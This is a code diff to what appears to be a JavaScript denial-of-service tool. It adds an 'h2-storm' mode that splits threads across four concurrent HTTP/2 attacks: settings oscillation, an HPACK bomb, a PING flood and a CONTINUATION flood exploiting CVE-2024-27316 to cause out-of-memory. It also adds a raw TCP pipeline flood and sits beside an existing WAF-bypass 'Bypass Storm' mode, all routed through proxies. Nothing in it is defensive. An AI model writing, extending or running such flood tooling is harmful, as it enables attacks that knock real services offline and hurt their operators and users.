@@ -5997,8 +5997,29 @@ async function runWorker() {
     // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST → App flood + Cache busting
     await runBypassStorm(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
+  } else if (cfg.method === "h2-storm") {
+    // H2 Storm — 4 simultaneous HTTP/2 attack vectors flooding all server H2 processing paths:
+    // (1) H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE + half-open streams
+    // (2) HPACK Bomb — incremental-indexed headers exhaust server dynamic table → eviction storm
+    // (3) H2 PING Storm — PING frames at max rate, server must ACK every single one
+    // (4) H2 CONTINUATION — CVE-2024-27316, server buffers unbounded CONTINUATION frames → OOM
+    // Threads split: ~30% Settings, ~25% HPACK, ~25% PING, ~20% CONTINUATION
+    const t5  = Math.max(1, Math.floor(cfg.threads / 5));
+    const t4  = Math.max(1, Math.floor(cfg.threads / 4));
+    const rem = Math.max(1, cfg.threads - t4 - t5 - t5);
+    await Promise.all([
+      runH2SettingsStorm(resolvedHost, hostname, targetPort, rem, ctrl.signal, onStats, cfg.proxies ?? []),
+      runHPACKBomb(resolvedHost, hostname, targetPort, t4, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2PingStorm(resolvedHost, hostname, targetPort, t5, cfg.proxies ?? [], ctrl.signal, onStats),
+      runH2Continuation(resolvedHost, hostname, targetPort, t5, ctrl.signal, onStats, cfg.proxies ?? []),
+    ]);
+
+  } else if (cfg.method === "pipeline-flood") {
+    // HTTP Pipeline Flood — raw TCP pipelining at maximum RPS
+    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+
   } else {
-    // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
+    // Default fallback: raw TCP pipeline
     await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
   }
 }
